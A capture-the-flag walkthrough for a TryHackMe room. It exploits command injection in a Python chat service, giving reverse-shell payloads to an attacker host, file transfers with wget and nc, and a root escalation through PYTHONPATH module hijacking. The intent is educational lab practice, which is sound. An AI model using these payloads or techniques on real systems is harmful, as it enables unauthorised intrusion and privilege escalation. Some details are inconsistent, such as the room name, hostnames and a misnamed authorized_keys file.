# JPGChat Walkthrough

Welcome to the Lookup challenge, here is the link to the [room](https://tryhackme.com/room/jpgchat) on TryHackMe.

In this challenge we will have to exploit a poortly made custom chatting service written in python.

Whenever you feel ready press on "Start Machine" and connect via OpenVPN from your machine or use the AttackBox.

Let's begin!

<br/>
<br/>

## The Challenge
Let's add the domain to the hosts file:
```bash
echo "MACHINE_IP jpg.thm" | sudo tee -a /etc/hosts
```

Now we scan for open ports with *nmap*:
```bash
nmap -sV -sC jpg.thm
```

It finds 2 open ports:
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     Welcome to JPChat
```

Let's interact with the chat service:
```bash
nc jpgchat.thm 3000
```

On access the application sends us the following message, with instructions on how to use the service:
```
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
```

Using the message option shows:
```
[MESSAGE]
There are currently 0 other users logged in
```

While using the report one will show:
```
[REPORT]
this report will be read by Mozzie-jpg
your name:
test
your report:
testreport
```

Now we know the admin name: "Mozzie-jpg"!
We also know, from the previous message, that the source code is available on the admin GitHub, since we now have either it's name and the app name we can search it up online.
You should find it quickly, otherwise here is the [page](https://github.com/Mozzie-jpg/JPChat).

Now inside the repo there is a file called `jpgchat.py`, let' inspect it.
```python
#!/usr/bin/env python3

import os

print ('Welcome to JPChat')
print ('the source code of this service can be found at our admin\'s github')

def report_form():

	print ('this report will be read by Mozzie-jpg')
	your_name = input('your name:\n')
	report_text = input('your report:\n')
	os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
	os.system("bash -c 'echo %s >> /opt/jpchat/logs/report.txt'" % report_text)

def chatting_service():

	print ('MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel')
	print ('REPORT USAGE: use [REPORT] to report someone to the admins (with proof)')
	message = input('')

	if message == '[REPORT]':
		report_form()
	if message == '[MESSAGE]':
		print ('There are currently 0 other users logged in')
		while True:
			message2 = input('[MESSAGE]: ')
			if message2 == '[REPORT]':
				report_form()

chatting_service()
```

This is a very simple script, we can super quickly spot the weak point, on line 13/14; The script will run a command directly on the system:
```bash
os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
```

Looks like we will be exploiting the report functionality, we simply have to inject some code as our name that will be executed on the system, since it's directly inserted in the `os.system()` function.
If we pass a reverse shell like:
```bash
sh -i >& /dev/tcp/ATTACKER_IP/1234 0>&1
```

We can see that it tries to connect to our listener `nc -lvnp 1234` after we send the report, but the session gets also instantly terminated.
We can fix that simply by prepending it with a string and the symbol `;`: 
```
test; bash -i >& /dev/tcp/ATTACKER_IP/1234 0>&1
```

This will successfully give us a reverse shell, but i was having problems as the commands were not showing any outputs, so i decided to switch reverse shell and put it in btween of `';SHELL_HERE;'`:
```bash
'; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP 1234 >/tmp/f ;'
```

This time it worked fine, we can now upgrade our shell (i made a guide [here]()) and get the user flag:
```bash
cat /home/wes/user.txt
```
--> ATTACKER_IP

<br/>

### Privilege Escalation
For a more stable connection let's add our SSH key.
Generate them:
```bash
ssh-keygen -t rsa -b 4096 -C "
```

Now you can copy your public key to the current working directory:
```bash
cp ~/.ssh/id_rsa.pub .
```

Start a python server:
```bash
python3 -m http.server
```

On the target machine create this directory: `~/.ssh`.
Download here your public key:
```bash
wget http://ATTACKER_IP:8000/id_rsa.pub
```

Rename the file:
```bash
mv id_rsa.pub authorized_key
```

Now we can finally login via SSH:
```bash
ssh wes@jpgchat.thm
```

From my machine i transferred the `linpeas.sh` script on the target using a python HTTP server:
```bash
python3 -m http.server
```

On target:
```bash
wget http://ATTACKER_IP:8000/linpeas.sh
```

Now let's make the file executable and run it:
```bash
chmod +x linpeas.sh
```
```bash
./linpeas.sh > linpeas_report
```

For better readability i then transferred the report on my machine:
```bash
nc -lvnp 4444 > linpeas_report
```

On target:
```bash
nc -nv ATTACKER_IP 4444 < linpeas_report
```

Interestingly we see that we can run as `sudo` a command without the need for a password:
```
User wes may run the following commands on ubuntu-xenial:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
```

Let's view the file permissions and content:
```bash
ls -l /opt/development/test_module.py
```
```bash
-rw-r--r-- 1 root root   93 Jan 15  2021 test_module.p
```

```bash
cat /opt/development/test_module.py
```

It contains the following Python script:
```python
#!/usr/bin/env python3
from compare import *

print(compare.Str('hello', 'hello', 'hello'))
```

It imports the `compare` module and then it print the output of `compare.Str()`.

We can create a malicious one that will read the root flag:
```python
#!/usr/bin/env python3
import sys

def Str(a, b, c):
    try:
        with open('/root/root.txt', 'r') as f:
            flag = f.read().strip()
        return flag
    except Exception as e:
        return "Error reading flag: {}".format(e)

# Bind the module itself to a variable named 'compare'
compare = sys.modules[__name__]
```

Call this file `compare.py`.

In that directory we do not have write permissions, we can make it in the `/tmp`.

Now we can change an env variable to point to our file:
```bash
export PYTHONPATH=/tmp
```

Then we can run it:
```bash
sudo /usr/bin/python3 /opt/development/test_module.py
```

And we successfully got the root flag:
--> REDACTED

<br/>
<br/>

## Conclusion
Congratulations you have successfully practiced and exploited different Python related vulnerabilities, to both get initial access and escalate your privileges.

I hope you had fun doing the challenge and following along!

Catch you in the next CTF 😃 
